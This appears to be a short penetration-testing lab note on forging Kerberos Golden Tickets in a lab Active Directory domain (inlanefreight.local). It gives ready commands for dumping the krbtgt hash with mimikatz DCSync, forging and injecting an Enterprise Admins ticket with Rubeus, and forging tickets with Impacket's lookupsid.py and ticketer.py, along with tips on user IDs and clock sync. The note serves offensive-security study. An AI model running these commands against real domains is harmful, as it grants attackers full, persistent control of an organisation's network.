Different elements are needed to forge a Golden Ticket:
1. `Domain Name`
2. `Domain SID`
3. `Username to Impersonate`
4. `KRBTGT's hash`

---
You can dump krbtgt hash using dcsync
### windows
```powershell
lsadump::dcsync /user:krbtgt /domain:inlanefreight.local
.\rubues golden /user:administrator /sid:<Domain sid> /groups:"ENTERPRISE ADMINS" /domain:inlanefreight.local /rc4:<hash> /ldap /nowrap /ptt
```

### Linux
```sh
lookupsid.py inlanefreight.local/pixis@dc01.inlanefreight.local -domain-sids # get SID

ticketer.py administrator -domain "$DOMAIN" -domain-sid S-1-5-21-1870146311-1183348186-593267556 -nthash c0231bd8a4a4de92fca0760c0ba9e7a6
ticketer.py htb-student12 -domain "$DOMAIN" -domain-sid S-1-5-21-1870146311-1183348186-593267556 -nthash c0231bd8a4a4de92fca0760c0ba9e7a6 -user-id 1126
```


> [!Attention] 
> When you forge users other than administrator you need to specify the `user-id`. which is not the full SID its only the last octet.


---



> [!Error] Sync issue
> Many times we tried to forge tickets but it fails and that was because we didn't sync the time.
